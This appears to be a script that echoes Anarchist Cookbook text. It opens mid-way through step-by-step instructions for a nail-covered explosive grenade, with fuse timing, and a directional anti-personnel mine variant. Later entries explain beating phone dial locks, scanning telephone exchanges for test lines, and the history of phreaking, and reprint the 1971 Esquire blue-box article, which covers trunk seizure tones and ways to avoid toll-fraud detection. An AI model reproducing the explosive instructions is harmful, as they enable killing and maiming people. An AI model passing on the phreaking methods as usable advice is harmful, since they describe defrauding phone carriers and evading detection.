echo can be drilled with relative safety. With plastic explosives, a hole can be made by pressing a round stick into the center of the charge. The 
echo hole should be deep enough that the blasting cap is totally within the explosive.
echo 2.Tape, tie, or glue one or two rows of closely packed nails to the sides of the explosive block. Nails should completely cover the four 
echo surfaces of the block.
echo 3.Place blasting cap on one end of the fuse cord and crimp with pliers.
echo NOTE: To find out how long the fuse cord should be, check the time it takes a known length to burn. If 12 inches (30 cm) burns for 30 seconds, 
echo a 10 second delay will require a 4 inch (10 cm) fuse.
echo 4.Insert the blasting cap in the hole in the block of explosive. Tape or tie fuse cord securely in place so that it will not fall out when the grenade 
echo is thrown.
echo Alternate Use:
echo An effective directional anti-personnel mine can be made by placing nails on only one side of the explosive block. For the case, and electric 
echo blasting cap can be used.

echo 147.Phone Dial Locks -- How to Beat'em by The Jolly Roger
echo Have you ever been in an office or somewhere and wanted to make a free phone call but some asshole put a lock on the phone to prevent 
echo out-going calls? Fret no more phellow phreak, for every system can be beaten with a little knowledge
echo There are two ways to beat this obstacle, first pick the lock, I don't have the time to teach locksmithing so we go to the second method which 
echo takes advantage of telephone electronics.
echo To be as simple as possible when you pick up the phone you complete a circuit known as a local loop. When you hang up you break the circuit. 
echo When you dial 'pulse' it also breaks the circuit but not long enough to hang up So you can "Push-dial." To do this you ">>> RAPIDLY <<<" 
echo depress the switchhook. For example, to dial an operator 'and then give her the number you want to call' ">>> RAPIDLY <<<" and ">>>" EVENLY 
echo "<<<" depress the switchhook 10 times. To dial 634-1268, depress 6 X'S pause, then 3 X'S, pause, then 4X'S, etc. It takes a little practice but 
echo you'll get the hang of it. Try practicing with your own # so you'll get a busy tone when right. It'll also work on touch-toneÖ since a DTMF line 
echo will also accept pulse. Also, never depress the switchhook for more than a second or it'll hang up
echo  Finally, remember that you have just as much right to that phone as the asshole who put the lock on it

echo 148.Exchange Scanning by The Jolly Roger
echo Almost every exchange in the bell system has test #'s and other "goodies" such as loops with dial-ups. These "goodies" are usually found 
echo between 9900 and 9999 in your local exchange. If you have the time and initiative, scan your exchange and you may become lucky
echo Here are some findings in the 914-268 exchange:
echo 9900 - ANI
echo 9901 - ANI
echo 9927 - OSC. TONE (POSSIBLE TONE SIDE OF A LOOP)
echo 9936 - VOICE # TO THE TELCO CENTRAL OFFICE
echo 9937 - VOICE # TO THE TELCO CENTRAL OFFICE
echo 9941 - COMPUTER (DIGITAL VOICE TRANSMISSION?)
echo 9960 - OSC. TONE (TONE SIDE LOOP) MAY ALSO BE A COMPUTER IN SOME EXCHANGES
echo 9961 - NO RESPONSE (OTHER END OF LOOP?)
echo 9962 - NO RESPONSE (OTHER END OF LOOP?)
echo 9963 - NO RESPONSE (OTHER END OF LOOP?)
echo 9966 - COMPUTER (SEE 9941)
echo 9968 - TONE THAT DISAPPEARS--RESPONDS TO CERTAIN TOUCH-TONE KEYS
echo Most of the numbers between 9900 and 9999 will ring or go to a "what #, please?" operator.

echo 149.A Short History of Phreaking by The Jolly Roger
echo  Well now we know a little vocabulary, and now its into history, Phreak history. Back at MIT in 1964 arrived a student by the name of Stewart 
echo Nelson, who was extremely interested in the telephone. Before entering MIT, he had built autodialers, cheese boxes, and many more gadgets. 
echo But when he came to MIT he became even more interested in "fone-hacking" as they called it. After a little while he naturally started using the 
echo PDP-1, the schools computer at that time, and from there he decided that it would be interesting to see whether the computer could generate 
echo the frequencies required for blue boxing. The hackers at MIT were not interested in ripping off Ma Bell, but just exploring the telephone 
echo network. Stew (as he was called) wrote a program to generate all the tones and set off into the vast network.
echo Now there were more people phreaking than the ones at MIT. Most people have heard of Captain Crunch (No not the cereal), he also 
echo discovered how to take rides through the fone system, with the aid of a small whistle found in a cereal box (can we guess which one?). By 
echo blowing this whistle, he generated the magical 2600hz and into the mouthpiece it sailed, giving him complete control over the system. I have 
echo heard rumors that at one time he made about ¬ of the calls coming out of San Francisco. He got famous fast. He made the cover of people 
echo magazine and was interviewed several times (as you'll soon see). Well he finally got caught after a long adventurous career. After he was 
echo caught he was put in jail and was beaten up quite badly because he would not teach other inmates how to box calls. After getting out, he 
echo joined Apple computer and is still out there somewhere.
echo Then there was Joe the Whistler, blind form the day he was born. He could whistle a perfect 2600hz tone. It was rumored phreaks used to call 
echo him to tune their boxes.
echo Well that was up to about 1970, then from 1970 to 1979, phreaking was mainly done by college students, businessmen and anyone who knew 
echo enough about electronics and the fone company to make a 555 Ic to generate those magic tones. Businessmen and a few college students 
echo mainly just blue box to get free calls. The others were still there, exploring 800#'s and the new ESS systems. ESS posed a big problem for 
echo phreaks then and even a bigger one now. ESS was not widespread, but where it was, blue boxing was next to impossible except for the most 
echo experienced phreak. Today ESS is installed in almost all major cities and blue boxing is getting harder and harder.
echo 1978 marked a change in phreaking, the Apple ][, now a computer that was affordable, could be programmed, and could save all that precious 
echo work on a cassette. Then just a short while later came the Apple Cat modem. With this modem, generating all blue box tones was easy as 
echo writing a program to count form one to ten (a little exaggerated). Pretty soon programs that could imitate an operator just as good as the real 
echo thing were hitting the community, TSPS and Cat's Meow, are the standard now and are the best.
echo 1982-1986: LD services were starting to appear in mass numbers. People now had programs to hack LD services, telephone exchanges, and 
echo even passwords. By now many phreaks were getting extremely good and BBS's started to spring up everywhere, each having many 
echo documentations on phreaking for the novice. Then it happened, the movie War Games was released and mass numbers of sixth grade to all 
echo ages flocked to see it. The problem wasn't that the movie was bad, it was that now EVERYONE wanted to be a hacker/phreak. Novices came 
echo out in such mass numbers, that bulletin boards started to be busy 24 hours a day. To this day, they still have not recovered. Other problems 
echo started to occur, novices guessed easy passwords on large government computers and started to play around... Well it wasn't long before 
echo they were caught, I think that many people remember the 414-hackers. They were so stupid as to say "yes" when the computer asked them 
echo whether they'd like to play games. Well at least it takes the heat off the real phreaks/hacker/crackers.

echo 150. "Secrets of the Little Blue Box" by Ron Rosenbaum
echo Dudes... These four files contain the story, "Secrets of the Little Blue Box".
echo -A story so incredible it may even make you feel sorry for the phone companyPrinted in the October 1971 issue of Esquire Magazine. If you happen to be in a library and come across a collection of Esquire magazines, the 
echo October 1971 issue is the first issue printed in the smaller format. The story begins on page 116 with a picture of a blue box.
echo --One Farad Cap, Atlantic Anarchist Guild
echo The Blue Box Is Introduced: Its Qualities Are Remarked I am in the expensively furnished living room of Al Gilbertson (His real name has been 
echo changed.), the creator of the "blue box." Gilbertson is holding one of his shiny black-and-silver "blue boxes" comfortably in the palm of his 
echo hand, pointing out the thirteen little red push buttons sticking up from the console. He is dancing his fingers over the buttons, tapping out 
echo discordant beeping electronic jingles. He is trying to explain to me how his little blue box does nothing less than place the entire telephone 
echo system of the world, satellites, cables and all, at the service of the blue-box operator, free of charge.
echo "That's what it does. Essentially it gives you the power of a super operator. You seize a tandem with this top button," he presses the top 
echo button with his index finger and the blue box emits a high-pitched cheep, "and like that" -- cheep goes the blue box again -- "you control the 
echo phone company's long-distance switching systems from your cute little Princes phone or any old pay phone. And you've got anonymity. An 
echo operator has to operate from a definite location: the phone company knows where she is and what she's doing. But with your beeper box, 
echo once you hop onto a trunk, say from a Holiday Inn 800 (toll-free) number, they don't know where you are, or where you're coming from, they 
echo don't know how you slipped into their lines and popped up in that 800 number. They don't even know anything illegal is going on. And you can 
echo obscure your origins through as many levels as you like. You can call next door by way of White Plains, then over to Liverpool by cable, and 
echo then back here by satellite. You can call yourself from one pay phone all the way around the world to a pay phone next to you. And you get 
echo your dime back too."
echo "And they can't trace the calls? They can't charge you?" "Not if you do it the right way. But you'll find that the free-call thing isn't really as 
echo exciting at first as the feeling of power you get from having one of these babies in your hand. I've watched people when they first get hold of 
echo one of these things and start using it, and discover they can make connections, set up crisscross and zigzag switching patterns back and 
echo forth across the world. They hardly talk to the people they finally reach. They say hello and start thinking of what kind of call to make next. 
echo They go a little crazy." He looks down at the neat little package in his palm. His fingers are still dancing, tapping out beeper patterns.
echo "I think it's something to do with how small my models are. There are lots of blue boxes around, but mine are the smallest and most 
echo sophisticated electronically. I wish I could show you the prototype we made for our big syndicate order."
echo He sighs. "We had this order for a thousand beeper boxes from a syndicate front man in Las Vegas. They use them to place bets coast to 
echo coast, keep lines open for hours, all of which can get expensive if you have to pay. The deal was a thousand blue boxes for $300 apiece. 
echo Before then we retailed them for $1500 apiece, but $300,000 in one lump was hard to turn down. We had a manufacturing deal worked out in 
echo the Philippines. Everything ready to go. Anyway, the model I had ready for limited mass production was small enough to fit inside a flip-top 
echo Marlboro box. It had flush touch panels for a keyboard, rather than these unsightly buttons, sticking out. Looked just like a tiny portable radio. In 
echo fact, I had designed it with a tiny transistor receiver to get one AM channel, so in case the law became suspicious the owner could switch on 
echo the radio part, start snapping his fingers, and no one could tell anything illegal was going on. I thought of everything for this model -- I had it 
echo lined with a band of thermite which could be ignited by radio signal from a tiny button transmitter on your belt, so it could be burned to ashes 
echo instantly in case of a bust. It was beautiful. A beautiful little machine. You should’ve seen the faces on these syndicate guys when they came 
echo back after trying it out. They'd hold it in their palm like they never wanted to let it go, and they'd say, 'I can't believe it. I can't believe it.' You 
echo probably won't believe it until you try it."
echo The Blue Box Is Tested: Certain Connections Are Made
echo About eleven o'clock two nights later Fraser Lucey has a blue box in the palm of his left hand and a phone in the palm of his right. He is 
echo standing inside a phone booth next to an isolated shut-down motel off Highway 1. I am standing outside the phone booth.
echo Fraser likes to show off his blue box for people. Until a few weeks ago when Pacific Telephone made a few arrests in his city, Fraser Lucey 
echo liked to bring his blue box (This particular blue box, like most blue boxes, is not blue. Blue boxes have come to be called "blue boxes" either
echo because 1) The first blue box ever confiscated by phone-company security men happened to be blue, or 2) To distinguish them from "black 
echo boxes." Black boxes are devices, usually a resistor in series, which, when attached to home phones, allow all incoming calls to be made 
echo without charge to one's caller.) to parties. It never failed: A few cheeps from his device and Fraser became the center of attention at the very 
echo hippest of gatherings, playing phone tricks and doing request numbers for hours. He began to take orders for his manufacturer in Mexico. He 
echo became a dealer.
echo Fraser is cautious now about where he shows off his blue box. But he never gets tired of playing with it. "It's like the first time every time," he 
echo tells me.
echo Fraser puts a dime in the slot. He listens for a tone and holds the receiver up to my ear. I hear the tone. Fraser begins describing, with a certain 
echo practiced air, what he does while he does it. "I'm dialing an 800 number now. Any 800 number will do. It's toll free. Tonight I think I'll use the ----
echo - (he names a well-know rent-a-car company) 800 number. Listen, It's ringing. Here, you hear it? Now watch." He places the blue box over the 
echo mouthpiece of the phone so that the one silver and twelve black push buttons are facing up toward me. He presses the silver button -- the one 
echo at the top -- and I hear that high-pitched beep. "That's 2600 cycles per second to be exact," says Lucey. "Now, quick. Listen." He shoves the 
echo earpiece at me. The ringing has vanished. The line gives a slight hiccough, there is a sharp buzz, and then nothing but soft white noise.
echo "We're home free now," Lucey tells me, taking back the phone and applying the blue box to its mouthpiece once again. "We're up on a tandem, 
echo into a long-lines trunk. Once you're up on a tandem, you can send yourself anywhere you want to go." He decides to check out London first. 
echo He chooses a certain pay phone located in Waterloo Station. This particular pay phone is popular with the phone-phreaks network because 
echo there are usually people walking by at all hours who will pick it up and talk for a while.
echo He presses the lower left-hand corner button which is marked "KP" on the face of the box. "That's Key Pulse. It tells the tandem we're ready to 
echo give it instructions. First I'll punch out KP 182 START, which will slide us into the overseas sender in White Plains." I hear a neat clunk-cheep. "I 
echo think we'll head over to England by satellite. Cable is actually faster and the connection is somewhat better, but I like going by satellite. So I just 
echo punch out KP Zero 44. The Zero is supposed to guarantee a satellite connection and 44 is the country code for England. Okay... we're there. In 
echo Liverpool actually. Now all I have to do is punch out the London area code which is 1, and dial up the pay phone. Here, listen, I've got a ring 
echo now."
echo I hear the soft quick purr-purr of a London ring. Then someone picks up the phone.
echo "Hello," says the London voice.
echo "Hello. Who's this?" Fraser asks.
echo "Hello. There's actually nobody here. I just picked this up while I was passing by. This is a public phone. There's no one here to answer 
echo actually."
echo "Hello. Don't hang up. I'm calling from the United States."
echo "Oh. What is the purpose of the call? This is a public phone you know."
echo "Oh. You know. To check out, uh, to find out what's going on in London. How is it there?"
echo "Its five o'clock in the morning. It's raining now."
echo "Oh. Who are you?"
echo The London passerby turns out to be an R.A.F. enlistee on his way back to the base in Lincolnshire, with a terrible hangover after a thirty-sixhour pass. He and Fraser talk about the rain. They agree that it's nicer when it's not raining. They say good-bye and Fraser hangs up. His dime 
echo returns with a nice clink.
echo "Isn't that far out," he says grinning at me. "London, like that."
echo Fraser squeezes the little blue box affectionately in his palm. "I told ya this thing is for real. Listen, if you don't mind I'm gonna try this girl I know 
echo in Paris. I usually give her a call around this time. It freaks her out. This time I'll use the ------ (a different rent-a-car company) 800 number and 
echo we'll go by overseas cable, 133; 33 is the country code for France, the 1 sends you by cable. Okay, here we go.... Oh damn. Busy. Who could 
echo she be talking to at this time?"
echo A state police car cruises slowly by the motel. The car does not stop, but Fraser gets nervous. We hop back into his car and drive ten miles in 
echo the opposite direction until we reach a Texaco station locked up for the night. We pull up to a phone booth by the tire pump. Fraser dashes 
echo inside and tries the Paris number. It is busy again.
echo "I don't understand who she could be talking to. The circuits may be busy. It's too bad I haven't learned how to tap into lines overseas with this 
echo thing yet."
echo Fraser begins to phreak around, as the phone phreaks say. He dials a leading nationwide charge card's 800 number and punches out the 
echo tones that bring him the time recording in Sydney, Australia. He beeps up the weather recording in Rome, in Italian of course. He calls a friend 
echo in Boston and talks about a certain over-the-counter stock they are into heavily. He finds the Paris number busy again. He calls up "Dial a Disc" 
echo in London, and we listen to Double Barrel by David and Ansil Collins, the number-one hit of the week in London. He calls up a dealer of another 
echo sort and talks in code. He calls up Joe Engressia, the original blind phone-phreak genius, and pays his respects. There are other calls. Finally 
echo Fraser gets through to his young lady in Paris.
echo They both agree the circuits must have been busy, and criticize the Paris telephone system. At two-thirty in the morning Fraser hangs up, 
echo pockets his dime, and drives off, steering with one hand, holding what he calls his "lovely little blue box" in the other.
echo You Can Call Long Distance For Less Than You Think
echo "You see, a few years ago the phone company made one big mistake," Gilbertson explains two days later in his apartment. "They were 
echo careless enough to let some technical journal publish the actual frequencies used to create all their multi-frequency tones. Just a theoretical 
echo article some Bell Telephone Laboratories engineer was doing about switching theory, and he listed the tones in passing. At ----- (a wellknown technical school) I had been fooling around with phones for several years before I came across a copy of the journal in the engineering 
echo library. I ran back to the lab and it took maybe twelve hours from the time I saw that article to put together the first working blue box. It was 
echo bigger and clumsier than this little baby, but it worked."
echo It's all there on public record in that technical journal written mainly by Bell Lab people for other telephone engineers. Or at least it was public. 
echo "Just try and get a copy of that issue at some engineering-school library now.
echo Bell has had them all red-tagged and withdrawn from circulation," Gilbertson tells me.
echo "But it's too late. It's all public now. And once they became public the technology needed to create your own beeper device is within the range 
echo of any twelve-year-old kid, any twelve-year-old blind kid as a matter of fact. And he can do it in less than the twelve hours it took us. Blind kids 
echo do it all the time. They can't build anything as precise and compact as my beeper box, but theirs can do anything mine can do."
echo "How?"
echo "Okay. About twenty years ago ATandT. made a multi-billion-dollar decision to operate its entire long-distance switching system on twelve 
echo electronically generated combinations of twelve master tones. Those are the tones you sometimes hear in the background after you've dialed a 
echo long-distance number. They decided to use some very simple tones -- the tone for each number is just two fixed single-frequency tones 
echo played simultaneously to create a certain beat frequency. Like 1300 cycles per second and 900 cycles per second played together give you 
echo the tone for digit 5. Now, what some of these phone phreaks have done is get themselves access to an electric organ. Any cheap family 
echo home-entertainment organ. Since the frequencies are public knowledge now -- one blind phone phreak has even had them recorded in one of 
echo the talking books for the blind -- they just have to find the musical notes on the organ which correspond to the phone tones. Then they tape 
echo them. For instance, to get Ma Bell's tone for the number 1, you press down organ keys F~5 and A~5 (900 and 700 cycles per second) at the 
echo same time. To produce the tone for 2 it's F~5 and C~6 (1100 and 700 cps). The phone phreaks circulate the whole list of notes so there's no 
echo trial and error anymore."
echo He shows me a list of the rest of the phone numbers and the two electric organ keys that produce them.
echo "Actually, you have to record these notes at 3 3/4 inches -per-second tape speed and double it to 7 « inches-per-second when you play them 
echo back, to get the proper tones," he adds.
echo "So once you have all the tones recorded, how do you plug them into the phone system?"
echo "Well, they take their organ and their cassette recorder, and start banging out entire phone numbers in tones on the organ, including country 
echo codes, routing instructions, 'KP' and 'Start' tones. Or, if they don't have an organ, someone in the phone-phreak network sends them a 
echo cassette with all the tones recorded, with a voice saying 'Number one,' then you have the tone, 'Number two,' then the tone and so on. So with 
echo two cassette recorders they can put together a series of phone numbers by switching back and forth from number to number. Any idiot in the 
echo country with a cheap cassette recorder can make all the free calls he wants."
echo "You mean you just hold the cassette recorder up the mouthpiece and switch in a series of beeps you've recorded? The phone thinks that 
echo anything that makes these tones must be its own equipment?"
echo "Right. As long as you get the frequency within thirty cycles per second of the phone company's tones, the phone equipment thinks it hears its 
echo own voice talking to it. The original granddaddy phone phreak was this blind kid with perfect pitch, Joe Engressia, who used to whistle into the 
echo phone. An operator could tell the difference between his whistle and the phone company's electronic tone generator, but the phone company's 
echo switching circuit can't tell them apart. The bigger the phone company gets and the further away from human operators it gets, the more 
echo vulnerable it becomes to all sorts of phone phreaking."
echo A Guide for the Perplexed
echo "But wait a minute," I stop Gilbertson. "If everything you do sounds like phone-company equipment, why doesn't the phone company charge 
echo you for the call the way it charges its own equipment?"
echo "Okay. That's where the 2600-cycle tone comes in. I better start from the beginning."
echo The beginning he describes for me is a vision of the phone system of the continent as thousands of webs, of long-line trunks radiating from 
echo each of the hundreds of toll switching offices to the other toll switching offices. Each toll switching office is a hive compacted of thousands of 
echo long-distance tandems constantly whistling and beeping to tandems in far-off toll switching offices.
echo The tandem is the key to the whole system. Each tandem is a line with some relays with the capability of signaling any other tandem in any 
echo other toll switching office on the continent, either directly one-to-one or by programming a roundabout route through several other tandems if all 
echo the direct routes are busy. For instance, if you want to call from New York to Los Angeles and traffic is heavy on all direct trunks between the 
echo two cities, your tandem in New York is programmed to try the next best route, which may send you down to a tandem in New Orleans, then up 
echo to San Francisco, or down to a New Orleans tandem, back to an Atlanta tandem, over to an Albuquerque tandem and finally up to Los Angeles.
echo When a tandem is not being used, when it's sitting there waiting for someone to make a long-distance call, it whistles. One side of the tandem, 
echo the side "facing" your home phone, whistles at 2600 cycles per second toward all the home phones serviced by the exchange, telling them it is 
echo at their service, should they be interested in making a long-distance call. The other side of the tandem is whistling 2600 cps. into one or more 
echo long-distance trunk lines, telling the rest of the phone system that it is neither sending nor receiving a call through that trunk at the moment, that 
echo it has no use for that trunk at the moment.
echo "When you dial a long-distance number the first thing that happens is that you are hooked into a tandem. A register comes up to the side of the 
echo tandem facing away from you and presents that side with the number you dialed. This sending side of the tandem stops whistling 2600 into its 
echo trunk line. When a tandem stops the 2600 tone it has been sending through a trunk, the trunk is said to be "seized," and is now ready to carry 
echo the number you have dialed -- converted into multi-frequency beep tones -- to a tandem in the area code and central office you want.
echo Now when a blue-box operator wants to make a call from New Orleans to New York he starts by dialing the 800 number of a company which 
echo might happen to have its headquarters in Los Angeles. The sending side of the New Orleans tandem stops sending 2600 out over the trunk to 
echo the central office in Los Angeles, thereby seizing the trunk. Your New Orleans tandem begins sending beep tones to a tandem it has 
echo discovered idly whistling 2600 cycles in Los Angeles. The receiving end of that LA tandem is seized, stops whistling 2600, listens to the beep 
echo tones which tell it which LA phone to ring, and starts ringing the 800 number. Meanwhile a mark made in the New Orleans office accounting 
echo tape notes that a call from your New Orleans phone to the 800 number in LA has been initiated and gives the call a code number. Everything is 
echo routine so far.
echo But then the phone phreak presses his blue box to the mouthpiece and pushes the 2600-cycle button, sending 2600 out from the New Orleans 
echo tandem to the LA tandem. The LA tandem notices 2600 cycles are coming over the line again and assumes that New Orleans has hung up 
echo because the trunk is whistling as if idle. The LA tandem immediately ceases ringing the LA 800 number. But as soon as the phreak takes his
echo finger off the 2600 button, the LA tandem assumes the trunk is once again being used because the 2600 is gone, so it listens for a new series 
echo of digit tones - to find out where it must send the call.
echo Thus the blue-box operator in New Orleans now is in touch with a tandem in LA which is waiting like an obedient genie to be told what to do 
echo next. The blue-box owner then beeps out the ten digits of the New York number which tell the LA tandem to relay a call to New York City. 
echo Which it promptly does. As soon as your party picks up the phone in New York, the side of the New Orleans tandem facing you stops sending 
echo 2600 cycles to you and starts carrying his voice to you by way of the LA tandem. A notation is made on the accounting tape that the 
echo connection has been made on the 800 call which had been initiated and noted earlier. When you stop talking to New York a notation is made 
echo that the 800 call has ended.
echo At three the next morning, when the phone company's accounting computer starts reading back over the master accounting tape for the past 
echo day, it records that a call of a certain length of time was made from your New Orleans home to an LA 800 number and, of course, the 
echo accounting computer has been trained to ignore those toll-free 800 calls when compiling your monthly bill.
echo "All they can prove is that you made an 800 toll-free call," Gilbertson the inventor concludes. "Of course, if you're foolish enough to talk for two 
echo hours on an 800 call, and they've installed one of their special anti-fraud computer programs to watch out for such things, they may spot you 
echo and ask why you took two hours talking to Army Recruiting's 800 number when you're 4-F.
echo But if you do it from a pay phone, they may discover something peculiar the next day -- if they've got a blue-box hunting program in their 
echo computer -- but you'll be a long time gone from the pay phone by then. Using a pay phone is almost guaranteed safe."
echo "What about the recent series of blue-box arrests all across the country -- New York, Cleveland, and so on?" I asked. "How were they caught 
echo so easily?"
echo "From what I can tell, they made one big mistake: they were seizing trunks using an area code plus 555-1212 instead of an 800 number. Using 
echo 555 is easy to detect because when you send multi-frequency beep tones of 555 you get a charge for it on your tape and the accounting 
echo computer knows there's something wrong when it tries to bill you for a two-hour call to Akron, Ohio, information, and it drops a trouble card 
echo which goes right into the hands of the security agent if they're looking for blue-box user.
echo "Whoever sold those guys their blue boxes didn't tell them how to use them properly, which is fairly irresponsible. And they were fairly stupid 
echo to use them at home all the time.
echo "But what those arrests really mean is than an awful lot of blue boxes are flooding into the country and that people are finding them so easy to 
echo make that they know how to make them before they know how to use them. Ma Bell is in trouble."
echo And if a blue-box operator or a cassette-recorder phone phreak sticks to pay phones and 800 numbers, the phone company can't stop them?
echo "Not unless they change their entire nationwide long-lines technology, which will take them a few billion dollars and twenty years. Right now 
echo they can't do a thing. They're screwed."
echo Captain Crunch Demonstrates His Famous Unit
echo There is an underground telephone network in this country. Gilbertson discovered it the very day news of his activities hit the papers. That 
echo evening his phone began ringing. Phone phreaks from Seattle, from Florida, from New York, from San Jose, and from Los Angeles began 
echo calling him and telling him about the phone-phreak network. He'd get a call from a phone phreak who'd say nothing but, "Hang up and call this 
echo number."
echo When he dialed the number he'd find himself tied into a conference of a dozen phone phreaks arranged through a quirky switching station in 
echo British Columbia. They identified themselves as phone phreaks, they demonstrated their homemade blue boxes which they called "M-Fers" (for 
echo "multi-frequency," among other things) for him, they talked shop about phone-phreak devices. They let him in on their secrets on the theory that 
echo if the phone company was after him he must be trustworthy. And, Gilbertson recalls, they stunned him with their technical sophistication.
echo I ask him how to get in touch with the phone-phreak network. He digs around through a file of old schematics and comes up with about a 
echo dozen numbers in three widely separated area codes.
echo "Those are the centers," he tells me. Alongside some of the numbers he writes in first names or nicknames: names like Captain Crunch, Dr. No, 
echo Frank Carson (also a code word for a free call), Marty Freeman (code word for M-F device), Peter Perpendicular Pimple, Alefnull, and The 
echo Cheshire Cat. He makes checks alongside the names of those among these top twelve who are blind. There are five checks.
echo I ask him who this Captain Crunch person is.
echo "Oh. The Captain. He's probably the most legendary phone phreak. He calls himself Captain Crunch after the notorious Cap'n Crunch 2600 
echo whistle." (Several years ago, Gilbertson explains, the makers of Cap'n Crunch breakfast cereal offered a toy -whistle prize in every box as a 
echo treat for the Cap'n Crunch set. Somehow a phone phreak discovered that the toy whistle just happened to produce a perfect 2600-cycle tone. 
echo When the man who calls himself Captain Crunch was transferred overseas to England with his Air Force unit, he would receive scores of 
echo calls from his friends and "mute" them -- make them free of charge to them -- by blowing his Cap'n Crunch whistle into his end.) "Captain 
echo Crunch is one of the older phone phreaks," Gilbertson tells me. "He's an engineer who once got in a little trouble for fooling around with the 
echo phone, but he can't stop. Well, the guy drives across country in a Volkswagen van with an entire switchboard and a computerized supersophisticated M-F-er in the back. He'll pull up to a phone booth on a lonely highway somewhere, snake a cable out of his bus, hook it onto the 
echo phone and sit for hours, days sometimes, sending calls zipping back and forth across the country, all over the world...."
echo Back at my motel, I dialed the number he gave me for "Captain Crunch" and asked for G---- T-----, his real name, or at least the name he uses 
echo when he's not dashing into a phone booth beeping out M-F tones faster than a speeding bullet and zipping phantomlike through the phone 
echo company's long-distance lines.
echo When G---- T----- answered the phone and I told him I was preparing a story for Esquire about phone phreaks, he became very indignant.
echo "I don't do that. I don't do that anymore at all. And if I do it, I do it for one reason and one reason only. I'm learning about a system. The phone 
echo company is a System. A computer is a System, do you understand? If I do what I do, it is only to explore a system. Computers, systems, that's 
echo my bag. The phone company is nothing but a computer."
echo A tone of tightly restrained excitement enters the Captain's voice when he starts talking about systems. He begins to pronounce each syllable 
echo w ith the hushed deliberation of an obscene caller.
echo "Ma Bell is a system I want to explore. It's a beautiful system, you know, but Ma Bell screwed up. It's terrible because Ma Bell is such a 
echo beautiful system, but she screwed up. I learned how she screwed up from a couple of blind kids who wanted me to build a device. A certain 
echo device. They said it could make free calls. I wasn't interested in free calls. But when these blind kids told me I could make calls into a computer, 
echo my eyes lit up. I wanted to learn about computers. I wanted to learn about Ma Bell's computers. So I build the little device, but I built it wrong and 
echo Ma Bell found out. Ma Bell can detect things like that. Ma Bell knows. So I'm strictly rid of it now. I don't do it. Except for learning purposes." He 
echo pauses. "So you want to write an article. Are you paying for this call? Hang up and call this number." He gives me a number in a area code a 
echo thousand miles away of his own. I dial the number.
echo "Hello again. This is Captain Crunch. You are speaking to me on a toll-free loop-around in Portland, Oregon. Do you know what a toll-free loop 
echo around is? I'll tell you."
echo He explains to me that almost every exchange in the country has open test numbers which allow other exchanges to test their connections 
echo with it. Most of these numbers occur in consecutive pairs, such as 302 956-0041 and 302 956-0042. Well, certain phone phreaks discovered 
echo that if two people from anywhere in the country dial the two consecutive numbers they can talk together just as if one had called the other's 
echo number, with no charge to either of them, of course.
echo "Now our voice is looping around in a 4A switching machine up there in Canada, zipping back down to me," the Captain tells me. "My voice is 
echo looping around up there and back down to you. And it can't ever cost anyone money. The phone phreaks and I have compiled a list of many of 
echo these numbers. You would be surprised if you saw the list. I could show it to you. But I won't. I'm out of that now. I'm not out to screw Ma Bell. 
echo I know better. If I do anything it's for the pure knowledge of the System. You can learn to do fantastic things. Have you ever heard eight 
echo tandems stacked up? Do you know the sound of tandems stacking and unstacking? Give me your phone number. Okay. Hang up now and wait 
echo a minute."
echo Slightly less than a minute later the phone rang and the Captain was on the line, his voice sounding far more excited, almost aroused.
echo "I wanted to show you what it's like to stack up tandems. To stack up tandems." (Whenever the Captain says "stack up" it sounds as if he is 
echo licking his lips.)
echo "How do you like the connection you're on now?" the Captain asks me. "It's a raw tandem. A raw tandem. Ain't nothing' up to it but a tandem. 
echo Now I'm going to show you what it's like to stack up. Blow off. Land in a far away place. To stack that tandem up, whip back and forth across 
echo the country a few times, then shoot on up to Moscow.
echo "Listen," Captain Crunch continues. "Listen. I've got line tie on my switchboard here, and I'm gonna let you hear me stack and unstack tandems. 
echo Listen to this. It's gonna blow your mind."
echo First I hear a super rapid-fire pulsing of the flutelike phone tones, then a pause, then another popping burst of tones, then another, then 
echo another. Each burst is followed by a beep-kachink sound.
echo "We have now stacked up four tandems," said Captain Crunch, sounding somewhat remote. "That's four tandems stacked up. Do you know 
echo what that means? That means I'm whipping back and forth, back and forth twice, across the country, before coming to you. I've been known to 
echo stack up twenty tandems at a time. Now, just like I said, I'm going to shoot up to Moscow."
echo There is a new, longer series of beeper pulses over the line, a brief silence, then a ring.
echo "Hello," answers a far-off voice.
echo "Hello. Is this the American Embassy Moscow?"
echo "Yes, sir. Who is this calling?" says the voice.
echo "Yes. This is test board here in New York. We're calling to check out the circuits, see what kind of lines you've got. Everything okay there in 
echo Moscow?"
echo "Okay?"
echo "Well, yes, how are things there?"
echo "Oh. Well, everything okay, I guess."
echo "Okay. Thank you."
echo They hang up, leaving a confused series of beep-kachink sounds hanging in mid-ether in the wake of the call before dissolving away.
echo The Captain is pleased. "You believe me now, don't you? Do you know what I'd like to do? I'd just like to call up your editor at Esquire and show 
echo him just what it sounds like to stack and unstack tandems. I'll give him a show that will blow his mind. What's his number?
echo I ask the Captain what kind of device he was using to accomplish all his feats. The Captain is pleased at the question.
echo "You could tell it was special, couldn't you?" Ten pulses per second. That's faster than the phone company's equipment. Believe me, this unit 
echo is the most famous unit in the country. There is no other unit like it. Believe me."
echo "Yes, I've heard about it. Some other phone phreaks have told me about it."
echo "They have been referring to my, ahem, unit? What is it they said? Just out of curiosity, did they tell you it was a highly sophisticated 
echo computer-operated unit, with acoustical coupling for receiving outputs and a switch-board with multiple-line-tie capability? Did they tell you that 
echo the frequency tolerance is guaranteed to be not more than .05 percent? The amplitude tolerance less than .01 decibel? Those pulses you 
echo heard were perfect. They just come faster than the phone company. Those were high-precision op-amps. Op-amps are instrumentation 
echo amplifiers designed for ultra-stable amplification, super-low distortion and accurate frequency response. Did they tell you it can operate in 
echo temperatures from -55øC to +125øC?"
echo I admit that they did not tell me all that.
echo "I built it myself," the Captain goes on. "If you were to go out and buy the components from an industrial wholesaler it would cost you at least 
echo $1500. I once worked for a semiconductor company and all this didn't cost me a cent. Do you know what I mean? Did they tell you about how I 
echo put a call completely around the world? I'll tell you how I did it. I M-Fed Tokyo inward, who connected me to India, India connected me to 
echo Greece, Greece connected me to Pretoria, South Africa, South Africa connected me to South America, I went from South America to London, I 
echo had a London operator connect me to a New York operator, I had New York connect me to a California operator who rang the phone next to 
echo me. Needless to say I had to shout to hear myself. But the echo was far out. Fantastic. Delayed. It was delayed twenty seconds, but I could 
echo hear myself talk to myself."
echo "You mean you were speaking into the mouthpiece of one phone sending your voice around the world into your ear through a phone on the 
echo other side of your head?" I asked the Captain. I had a vision of something vaguely autoerotic going on, in a complex electronic way.
